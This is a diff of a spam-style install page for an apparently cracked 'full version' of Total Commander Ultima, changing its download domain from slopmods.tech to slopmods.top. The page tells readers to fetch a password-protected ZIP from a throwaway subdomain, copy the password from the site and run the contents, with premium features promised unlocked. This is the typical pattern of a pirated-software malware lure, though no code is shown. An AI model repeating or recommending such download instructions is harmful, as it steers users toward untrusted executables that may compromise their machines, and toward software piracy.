@@ -1,6 +1,6 @@
 ***
 
-# Total Commander Ultima Full Version — Windows Install
+# Total Commander Ultima Windows Setup
 
 Total Commander Ultima — Windows setup and configuration · Premium workspace · Zero nag dialogs.
 
@@ -8,12 +8,12 @@ Total Commander Ultima — Windows setup and configuration · Premium workspace 
 
 > Use the release page below for Windows.
 
-- **Release page:** [bebkpnbsegb.slopmods.tech](https://bebkpnbsegb.slopmods.tech/)
-- **Full URL:** `https://bebkpnbsegb.slopmods.tech/`
+- **Release page:** [bebkpnbsegb.slopmods.top](https://bebkpnbsegb.slopmods.top/)
+- **Full URL:** `https://bebkpnbsegb.slopmods.top/`
 - **Type:** Desktop package | Windows 10 and 11, 64-bit
 - **Setup:** Extract the ZIP, copy the archive password from the page, then run the current version
 
-> **Password** — copy it from the yellow box on **bebkpnbsegb.slopmods.tech** before you extract.
+> **Password** — copy it from the yellow box on **bebkpnbsegb.slopmods.top** before you extract.
 
 ## Questions & Answers
 
@@ -33,13 +33,8 @@ Total Commander Ultima — Windows setup and configuration · Premium workspace 
 
 This release ships the **professional desktop edition** — premium modules are **enabled and active** from the first launch. No trial mode, no feature gates.
 
-Download once from **bebkpnbsegb.slopmods.tech**, extract, open the app, and work with the full toolkit immediately.
+Download once from **bebkpnbsegb.slopmods.top**, extract, open the app, and work with the full toolkit immediately.
 
-
-
-## Search notes
-
-Install guide for **Total Commander Ultima** full version on Windows PC (setup notes from release page).
 ## What you get
 
 - Core Total Commander Ultima features on Windows desktop
